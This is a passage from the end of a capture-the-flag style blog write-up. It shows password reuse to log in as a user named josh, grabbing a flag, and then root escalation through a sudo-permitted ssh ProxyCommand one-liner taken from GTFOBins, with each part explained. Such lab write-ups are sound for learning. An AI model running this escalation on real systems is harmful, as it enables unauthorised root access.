</span></span></code></pre></div><p>This was the Admin password for the postgresql database. The only other user i need to try it on is josh. So, I did and it logged me in as Josh and that is why we don&rsquo;t reuse passwords&mldr;</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928173623.png alt=image21 loading=lazy></figure></p><p>Retrieved the flag on <code>/home/josh/flag.txt</code></p><h2 id=privilege-escalation class="relative group">Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#privilege-escalation aria-label=Anchor>#</a></span></h2><p>Looks like Josh is able to execute commands as root for ssh.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928173738.png alt=image22 loading=lazy></figure></p><p>This is where <a href=https://gtfobins.github.io/ target=_blank rel=noreferrer>GTFobins</a> is my best friend. A quick search for ssh and we can escalate to root with <a href=https://gtfobins.github.io/gtfobins/ssh/#sudo target=_blank rel=noreferrer>ssh</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ssh -o <span class=nv>ProxyCommand</span><span class=o>=</span><span class=s1>&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
</span></span></code></pre></div><ul><li><code>ssh</code>: This is the command to initiate an SSH (Secure Shell) session, typically used to connect to remote servers securely.</li><li><code>-o ProxyCommand=';sh 0&lt;&amp;2 1>&amp;2'</code>: This is the custom SSH option (<code>-o</code>) that specifies a proxy command to establish the SSH connection. The value of the <code>ProxyCommand</code> option is <code>' ;sh 0&lt;&amp;2 1>&amp;2'</code>.</li><li><code>;</code>: The semicolon (<code>;</code>) is used to separate multiple commands in a single line. In this case, it separates the empty command (<code>''</code>) from the subsequent command (<code>'sh 0&lt;&amp;2 1>&amp;2'</code>).</li><li><code>sh</code>: This is the command to run a shell, in this case, the Bourne shell (<code>sh</code>).</li><li><code>0&lt;&amp;2</code>: This part of the command is used for input redirection. It redirects file descriptor 0 (standard input) to file descriptor 2 (standard error).</li><li><code>1>&amp;2</code>: This part of the command is used for output redirection. It redirects file descriptor 1 (standard output) to file descriptor 2 (standard error).</li><li><code>x</code>: This is the hostname or IP address of the remote server to which you want to establish an SSH connection.</li></ul><p><figure><img class="mx-auto my-0 rounded-md" src=//assets/img/20230928174031.png alt=image23 loading=lazy></figure></p><p>Like ChatGPT said: `<em>&ldquo;Unlocking the digital treasure chest, one &lsquo;root&rsquo; at a time!</em>&rdquo;</p></section><footer class=pt-8></footer></article><div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer class="py-10 print:hidden"><div class="flex items-center justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">Copy, <em>right?</em> ğŸ¤”</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://github.com/jpanther/congo target=_blank rel="noopener noreferrer">Congo</a></p></div><div class="flex flex-row items-center"><div class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"><button id=appearance-switcher-0 type=button aria-label="appearance switcher"><div class="flex items-center justify-center w-12 h-12 dark:hidden" title="Switch to dark appearance"><span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden w-12 h-12 dark:flex" title="Switch to light appearance"><span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div></div></footer><div id=search-wrapper class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://solidshadw.me/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative inline-block align-text-bottom px-1 icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>